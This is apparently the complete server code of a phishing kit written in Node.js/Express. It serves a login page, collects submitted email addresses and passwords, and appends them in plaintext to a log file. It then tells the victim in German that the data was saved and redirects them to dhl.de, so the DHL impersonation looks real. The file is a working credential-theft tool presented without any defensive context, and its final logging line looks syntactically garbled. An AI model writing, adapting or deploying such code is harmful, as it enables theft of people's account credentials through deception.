const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: false }));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/save", (req, res) => {
  const { email, password } = req.body;
  const logEntry = `${new Date().toISOString()} | ${email} | ${password}\n`;
  fs.appendFileSync("log.txt", logEntry);
  res.send(`
    <h3>Daten gespeichert!</h3>
    <p>Du wirst weitergeleitet...</p>
    <script>
      setTimeout(() => {
        window.location.href = "https://www.dhl.de";
      }, 3000);
    </script>
  `);
});

app.listen(PORT, () => {
  console.log(\`Server läuft auf Port \${PORT}\`);
});
